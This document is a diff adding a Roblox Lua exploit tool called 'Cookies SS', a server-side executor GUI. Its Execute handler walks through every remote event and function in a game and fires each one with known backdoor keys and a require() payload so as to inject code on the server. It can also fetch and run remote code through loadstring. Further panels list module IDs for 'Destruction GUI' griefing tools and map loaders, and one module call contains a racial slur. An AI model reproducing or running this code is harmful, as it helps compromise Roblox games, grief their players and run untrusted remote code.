@@ -1,0 +1,614 @@
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+pcall(function() player:WaitForChild("PlayerGui"):FindFirstChild("Cookies SS"):Destroy() end)
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.Name = "Cookies SS"
+gui.ResetOnSpawn = false
+local frame = Instance.new("Frame", gui)
+frame.Position = UDim2.new(0, 270, 0, 50)
+frame.Size = UDim2.new(0, 250, 0, 190)
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame.Active = true
+frame.Draggable = true
+Instance.new("UICorner",frame).CornerRadius=UDim.new(0,3)
+Instance.new("UIStroke",frame).Color=Color3.new(1,1,1)
+local line = Instance.new("Frame", frame)
+line.Position = UDim2.new(0, 0, 0, 39)
+line.Size = UDim2.new(0, 250, 0, 1)
+line.BackgroundColor3 = Color3.new(1, 1, 1)
+line.BorderSizePixel = 0
+local KP = Instance.new("Frame", frame)
+KP.Position = UDim2.new(0, 0, 0, 40)
+KP.Size = UDim2.new(0, 250, 0, 150)
+KP.BackgroundTransparency = 1
+local KP2 = Instance.new("Frame", KP)
+KP2.Position = UDim2.new(0, 0, 0, 0)
+KP2.Size = UDim2.new(0, 250, 0, 150)
+KP2.BackgroundTransparency = 1
+local KP3 = Instance.new("Frame", KP)
+KP3.Position = UDim2.new(0, 0, 0, 0)
+KP3.Size = UDim2.new(0, 250, 0, 150)
+KP3.Visible = false
+KP3.BackgroundTransparency = 1
+local scroll = Instance.new("ScrollingFrame", KP)
+scroll.Position = UDim2.new(0, 0, 0, 0)
+scroll.Size = UDim2.new(0, 250, 0, 150)
+scroll.BackgroundColor3 = Color3.new(1, 1, 1)
+scroll.ScrollBarThickness = 0
+scroll.CanvasSize = UDim2.new(0, 0, 2, 0)
+scroll.BorderSizePixel = 0
+scroll.Visible = false
+scroll.BackgroundTransparency = 1
+local scroll2 = Instance.new("ScrollingFrame", KP)
+scroll2.Position = UDim2.new(0, 0, 0, 0)
+scroll2.Size = UDim2.new(0, 250, 0, 150)
+scroll2.BackgroundColor3 = Color3.new(1, 1, 1)
+scroll2.ScrollBarThickness = 0
+scroll2.CanvasSize = UDim2.new(0, 0, 3, 0)
+scroll2.BorderSizePixel = 0
+scroll2.Visible = false
+scroll2.BackgroundTransparency = 1
+local scroll3 = Instance.new("ScrollingFrame", KP)
+scroll3.Position = UDim2.new(0, 0, 0, 0)
+scroll3.Size = UDim2.new(0, 250, 0, 150)
+scroll3.BackgroundColor3 = Color3.new(1, 1, 1)
+scroll3.ScrollBarThickness = 0
+scroll3.CanvasSize = UDim2.new(0, 0, 0, 0)
+scroll3.BorderSizePixel = 0
+scroll3.Visible = false
+scroll3.BackgroundTransparency = 1
+
+local box = Instance.new("TextBox", KP2)
+box.Position = UDim2.new(0, 10, 0, 10)
+box.Size = UDim2.new(0, 230, 0, 80)
+box.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+box.Font = Enum.Font.Gotham
+box.Text = 'require(12012115295).load("'..player.Name..'")'
+box.PlaceholderText = "-- Cookies SS"
+box.TextSize = 14
+box.TextColor3 = Color3.new(1, 1, 1)
+box.TextTransparency = 0
+box.TextXAlignment = Enum.TextXAlignment.Left
+box.TextYAlignment = Enum.TextYAlignment.Top
+box.ClearTextOnFocus = false
+box.TextWrapped = true
+local Uis = Instance.new("UIStroke", box)
+Uis.Color = Color3.new(1,1,1)
+Uis.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+Instance.new("UICorner",box).CornerRadius=UDim.new(0,3)
+
+local function createTextButton(position, size, textSize, text, parent)
+    local btn = Instance.new("TextButton")
+    btn.Position = position
+    btn.Size = size
+    btn.BackgroundColor3 = Color3.new(0,0,0)
+    btn.TextSize = textSize
+    btn.Text = text
+    btn.TextColor3 = Color3.new(1,1,1)
+    btn.Font = Enum.Font.SourceSans
+    btn.Parent = parent
+    Instance.new("UICorner",btn).CornerRadius=UDim.new(0,3)
+    local Uis = Instance.new("UIStroke", btn)
+    Uis.Color = Color3.new(1,1,1)
+    Uis.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    return btn
+end
+
+local x = createTextButton(UDim2.new(0, 220, 0, 10), UDim2.new(0, 20, 0, 20), 16, "X", frame)
+x.MouseButton1Click:Connect(function()
+gui:Destroy()
+end)
+
+local mini = createTextButton(UDim2.new(0, 190, 0, 10), UDim2.new(0, 20, 0, 20), 16, "-", frame)
+mini.MouseButton1Click:Connect(function()
+if KP.Visible then
+   frame:TweenSize(UDim2.new(0, 250, 0, 40), "Out", "Quart", 0.4, true)
+   KP.Visible = false
+   mini = false
+wait(0.1)
+   line.Visible = false
+   mini = true
+else
+   frame:TweenSize(UDim2.new(0, 250, 0, 190), "Out", "Quart", 0.4, true)
+   mini = false
+wait(0.1)
+   mini = true
+wait(0,8)
+   KP.Visible = true
+   line.Visible = true
+   end
+end)
+
+local file = createTextButton(UDim2.new(0, 160, 0, 10), UDim2.new(0, 20, 0, 20), 12, "File", frame)
+file.MouseButton1Click:Connect(function()
+if KP2.Visible then
+   KP2.Visible = false
+   KP3.Visible = true
+   scroll.Visible = false
+   scroll2.Visible = false
+   scroll3.Visible = false
+else
+   KP2.Visible = true
+   KP3.Visible = false
+   scroll.Visible = false
+   scroll2.Visible = false
+   scroll3.Visible = false
+   end
+end)
+
+local exe = createTextButton(UDim2.new(0, 10, 0, 103), UDim2.new(0, 60, 0, 35), 16, "Execute", KP2)
+exe.MouseButton1Click:Connect(function()
+function execute()
+local dateTimeNow = DateTime.now
+local tableFind = table.find
+local taskSpawn = task.spawn
+local taskWait = task.wait
+local stringRep = string.rep
+local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local JointsService = game:GetService("JointsService")
+local StarterGui = game:GetService("StarterGui")
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local requireScript = (box.Text)
+local alternativeSS = {
+	run = { [1] = "5#lGIERKWEF" },	emma = { [1] = "pwojr8hoc0-gr0yxohlgp-0feb7ncxed", [1] = ",,,,,,,,,,,,,,," },
+	helpme = { [1] = "helpme" },
+	pickett = { [1] = "cGlja2V0dA==" }
+}
+
+local function attached(possibleWait)
+	local PlayerGui =  LocalPlayer.PlayerGui
+	if possibleWait then
+		local start = dateTimeNow().UnixTimestampMillis
+		local possibleWait = possibleWait * 1000
+		while PlayerGui and not PlayerGui:FindFirstChild("Injected!") and (possibleWait > dateTimeNow().UnixTimestampMillis - start) do
+			taskWait()
+		end
+	end
+	return PlayerGui and PlayerGui:FindFirstChild("Injected!")
+end
+
+local function validRemote(rm)
+	local Parent = rm.Parent
+	if getgenv().blacklisted then
+		if tableFind(getgenv().blacklisted, rm:GetFullName()) then return false end
+	end
+	if Parent then
+		if Parent == JointsService then return false end
+		if (Parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION")) or
+			(rm.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage) then return false end
+end
+	if rm:IsDescendantOf(RobloxReplicatedStorage) then return false end
+	return true
+end
+
+local function harked()
+	local backpack = LocalPlayer.Backpack 
+	return backpack:FindFirstChild("HandlessSegway") and
+		backpack.HandlessSegway:FindFirstChild("RemoteEvents") and
+		backpack.HandlessSegway.RemoteEvents:FindFirstChild("DestroySegway")
+end
+
+local function emmaBackdoor(rm)
+	local Parent = rm.Parent
+	return rm.Name == "emma" and Parent and Parent.Name == "mynameemma" and Parent.Parent == ReplicatedStorage
+end
+
+local function runBackdoor(rm)
+	local Parent = rm.Parent
+	return rm.Name == "Run" and Parent and
+		Parent:FindFirstChild("Pages") and Parent:FindFirstChild("R6") and
+		Parent:FindFirstChild("Version") and Parent:FindFirstChild("Title")
+end
+
+local function httpRequest(url)
+	if syn and syn.request then return syn.request({Url=url}).Body
+	elseif request then return request({Url=url}).Body
+	else return game:HttpGetAsync(url) end
+end
+
+local function scanGame()
+	if harked() then
+		loadstring(httpRequest(alternativeSS.harked))()
+		return
+	end
+	do
+		local DescendantsList = game:GetDescendants()
+		for index=1, #DescendantsList do
+			if attached() then break end
+			local remote = DescendantsList[index]
+			if not validRemote(remote) then continue end
+			if remote.ClassName ~= "RemoteEvent" then continue end
+			if emmaBackdoor(remote) then
+				remote:FireServer(unpack(alternativeSS.emma), requireScript)
+			end
+			if not attached() and runBackdoor(remote) then
+				remote:FireServer(unpack(alternativeSS.run), requireScript)
+			end
+			if not attached() then remote:FireServer(unpack(alternativeSS.helpme), requireScript) end
+			if not attached() then remote:FireServer(unpack(alternativeSS.pickett), requireScript) end
+			if not attached() then remote:FireServer(requireScript) end
+		end
+		if attached() then return end
+		for index=1, #DescendantsList do
+			if attached() then break end
+			local remote = DescendantsList[index]
+			if not validRemote(remote) then continue end
+			if remote.ClassName ~= "RemoteFunction" then continue end
+			local waiting = true
+			taskSpawn(function()
+				remote:InvokeServer(requireScript)
+				waiting = nil
+			end)
+			local start = dateTimeNow().UnixTimestampMillis
+			while waiting and 1000 > dateTimeNow().UnixTimestampMillis - start do
+				taskWait()
+			end
+		end
+	end
+end
+
+local function Main()
+scanGame()
+end
+if game:IsLoaded() then
+pcall(Main)
+end
+end
+execute()
+end)
+
+local clear = createTextButton(UDim2.new(0, 83, 0, 103), UDim2.new(0, 60, 0, 35), 16, "Clear", KP2)
+clear.MouseButton1Click:Connect(function()
+box.Text=""
+end)
+
+local r6 = createTextButton(UDim2.new(0, 156, 0, 103), UDim2.new(0, 35, 0, 35), 16, "R6", KP2)
+r6.MouseButton1Click:Connect(function()
+
+end)
+
+local re = createTextButton(UDim2.new(0, 204, 0, 103), UDim2.new(0, 35, 0, 35), 16, "RE", KP2)
+re.MouseButton1Click:Connect(function()
+
+end)
+
+local page = createTextButton(UDim2.new(0, 10, 0, 10), UDim2.new(0, 70, 0, 130), 10, "Destruction GUI", KP3)
+page.MouseButton1Click:Connect(function()
+if KP3.Visible then
+   KP3.Visible = false
+   scroll.Visible = true
+else
+   KP3.Visible = true
+   scroll.Visible = false
+   end
+end)
+
+local page2 = createTextButton(UDim2.new(0, 90, 0, 10), UDim2.new(0, 70, 0, 130), 14, "GUI & Script", KP3)
+page2.MouseButton1Click:Connect(function()
+if KP3.Visible then
+   KP3.Visible = false
+   scroll2.Visible = true
+else
+   KP3.Visible = true
+   scroll2.Visible = false
+   end
+end)
+
+local page3 = createTextButton(UDim2.new(0, 170, 0, 10), UDim2.new(0, 70, 0, 130), 16, "Map", KP3)
+page3.MouseButton1Click:Connect(function()
+if KP3.Visible then
+   KP3.Visible = false
+   scroll3.Visible = true
+else
+   KP3.Visible = true
+   scroll3.Visible = false
+   end
+end)
+
+local guis = createTextButton(UDim2.new(0, 5, 0, 5), UDim2.new(0, 56, 0, 35), 8, "Team fat Gui v21", scroll)
+guis.MouseButton1Click:Connect(function()
+box.Text=('require(14940596979).fat("'..player.Name..'")')
+setclipboard("teamfatguiv19easter")
+end)
+
+local guis = createTextButton(UDim2.new(0, 66, 0, 5), UDim2.new(0, 56, 0, 35), 8, "Secret K00pgui v4", scroll)
+guis.MouseButton1Click:Connect(function()
+box.Text=('require(16965754044):load("'..player.Name..'")')
+setclipboard("Zelow")
+end)
+
+local guis = createTextButton(UDim2.new(0, 128, 0, 5), UDim2.new(0, 56, 0, 35), 10, "H01PK Gui V21", scroll)
+guis.MouseButton1Click:Connect(function()
+box.Text=('require(0x4af2144545ce).ALLNIGGAITISKINGV44LEAKKKkh01pkOnTOP("'..player.Name..'")')
+end)
+
+local guis = createTextButton(UDim2.new(0, 189, 0, 5), UDim2.new(0, 56, 0, 35), 10, "xpl0id v5 Gui", scroll)
+guis.MouseButton1Click:Connect(function()
+box.Text=('require(77025880046082).v5("'..player.Name..'")')
+end)
+
+local guis = createTextButton(UDim2.new(0, 5, 0, 46), UDim2.new(0, 56, 0, 35), 10, "Dr4g Gui v5", scroll)
+guis.MouseButton1Click:Connect(function()
+box.Text=('require(0x391c103dd).load("'..player.Name..'")')
+end)
+
+local guis = createTextButton(UDim2.new(0, 66, 0, 46), UDim2.new(0, 56, 0, 35), 10, "Darius Gui v13", scroll)
+guis.MouseButton1Click:Connect(function()
+box.Text=('require(127445614272366).op("'..player.Name..'")')
+end)
+
+local guis = createTextButton(UDim2.new(0, 128, 0, 46), UDim2.new(0, 56, 0, 35), 10, "K00pgui v11", scroll)
+guis.MouseButton1Click:Connect(function()
+box.Text=('require(15267263357).V11("'..player.Name..'")')
+end)
+
+local guis = createTextButton(UDim2.new(0, 189, 0, 46), UDim2.new(0, 56, 0, 35), 10, "Tubers93 Gui v5", scroll)
+guis.MouseButton1Click:Connect(function()
+box.Text=('require(0x6989826cf265)("'..player.Name..'")')
+end)
+
+local guis = createTextButton(UDim2.new(0, 5, 0, 87), UDim2.new(0, 56, 0, 35), 10, "Cr4kgui v11", scroll)
+guis.MouseButton1Click:Connect(function()
+box.Text=('require(132380103487790).Erika("'..player.Name..'")')
+end)
+
+local guis = createTextButton(UDim2.new(0, 66, 0, 87), UDim2.new(0, 56, 0, 35), 10, "p00ngkidd Gui", scroll)
+guis.MouseButton1Click:Connect(function()
+box.Text=('require(15204636597).undetectb("'..player.Name..'")')
+end)
+
+local guis = createTextButton(UDim2.new(0, 128, 0, 87), UDim2.new(0, 56, 0, 35), 6, "20193843728a Gui Private", scroll)
+guis.MouseButton1Click:Connect(function()
+box.Text=('require(15145876262).V2("'..player.Name..'")')
+end)
+
+local guis = createTextButton(UDim2.new(0, 189, 0, 87), UDim2.new(0, 56, 0, 35), 8, "Team BadsStuff Gui", scroll)
+guis.MouseButton1Click:Connect(function()
+box.Text=('require(15680206962).rust("'..player.Name..'")')
+end)
+
+local guis = createTextButton(UDim2.new(0, 5, 0, 128), UDim2.new(0, 56, 0, 35), 6, "Young Sheldon.exe Gui", scroll)
+guis.MouseButton1Click:Connect(function()
+box.Text=('require(96855101727017):Load("'..player.Name..'")')
+end)
+
+local guis = createTextButton(UDim2.new(0, 66, 0, 128), UDim2.new(0, 56, 0, 35), 8, "Dryq74 Gui", scroll)
+guis.MouseButton1Click:Connect(function()
+box.Text=('require(134839673375508).Dryq74gui("'..player.Name..'")')
+end)
+
+local guis = createTextButton(UDim2.new(0, 128, 0, 128), UDim2.new(0, 56, 0, 35), 10, "1x1x1x1 Gui", scroll)
+guis.MouseButton1Click:Connect(function()
+box.Text=('require(6858594080).KrnKidsSus("'..player.Name..'")')
+end)
+
+local guis = createTextButton(UDim2.new(0, 189, 0, 128), UDim2.new(0, 56, 0, 35), 8, "Dream-Bull Gui v18", scroll)
+guis.MouseButton1Click:Connect(function()
+box.Text=('require(15232587754).DreamGUI("'..player.Name..'")')
+end)
+
+local ss = createTextButton(UDim2.new(0, 5, 0, 5), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 66, 0, 5), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 128, 0, 5), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 189, 0, 5), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 5, 0, 46), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 66, 0, 46), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 128, 0, 46), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 189, 0, 46), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 5, 0, 87), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 66, 0, 87), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 128, 0, 87), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 189, 0, 87), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 5, 0, 128), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 66, 0, 128), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 128, 0, 128), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 189, 0, 128), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 5, 0, 169), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 66, 0, 169), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 128, 0, 169), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 189, 0, 169), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 5, 0, 210), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 66, 0, 210), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 128, 0, 210), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 189, 0, 210), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 5, 0, 251), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 66, 0, 251), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 128, 0, 251), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 189, 0, 251), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 5, 0, 292), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 66, 0, 292), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 128, 0, 292), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 189, 0, 292), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 5, 0, 333), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 66, 0, 333), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 128, 0, 333), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local ss = createTextButton(UDim2.new(0, 189, 0, 333), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll2)
+ss.MouseButton1Click:Connect(function()
+box.Text=('')
+end)
+
+local map = createTextButton(UDim2.new(0, 5, 0, 5), UDim2.new(0, 56, 0, 35), 10, "Backrooms", scroll3)
+map.MouseButton1Click:Connect(function()
+box.Text=('require(12313683305).backrooms()')
+end)
+
+local map = createTextButton(UDim2.new(0, 66, 0, 5), UDim2.new(0, 56, 0, 35), 8, "Golden Corral's", scroll3)
+map.MouseButton1Click:Connect(function()
+box.Text=('require(91736492445221).goldencorral()')
+end)
+
+local map = createTextButton(UDim2.new(0, 128, 0, 5), UDim2.new(0, 56, 0, 35), 12, "Obby Map", scroll3)
+map.MouseButton1Click:Connect(function()
+box.Text=('require(7977633723).thisbacon()')
+end)
+
+local map = createTextButton(UDim2.new(0, 189, 0, 5), UDim2.new(0, 56, 0, 35), 8, "Mountain House", scroll3)
+map.MouseButton1Click:Connect(function()
+box.Text=('require(7993365051).CLoad()')
+end)
+
+local map = createTextButton(UDim2.new(0, 5, 0, 46), UDim2.new(0, 56, 0, 35), 10, "The Refinary", scroll3)
+map.MouseButton1Click:Connect(function()
+box.Text=('require(14080317322).Refinary()')
+end)
+
+local map = createTextButton(UDim2.new(0, 66, 0, 46), UDim2.new(0, 56, 0, 35), 10, "Tantive Space", scroll3)
+map.MouseButton1Click:Connect(function()
+box.Text=('require(4081020916).loadmap()')
+end)
+
+local map = createTextButton(UDim2.new(0, 128, 0, 46), UDim2.new(0, 56, 0, 35), 10, "CS:GO Office", scroll3)
+map.MouseButton1Click:Connect(function()
+box.Text=('require(3155301605).loadmap()')
+end)
+
+local map = createTextButton(UDim2.new(0, 189, 0, 46), UDim2.new(0, 56, 0, 35), 12, "Guest house", scroll3)
+map.MouseButton1Click:Connect(function()
+box.Text=('require(4063168815).loadmap()')
+end)
+
+local map = createTextButton(UDim2.new(0, 5, 0, 87), UDim2.new(0, 56, 0, 35), 10, "Space Elevator", scroll3)
+map.MouseButton1Click:Connect(function()
+box.Text=('require(5702244094).space("'..player.Name..'")')
+end)
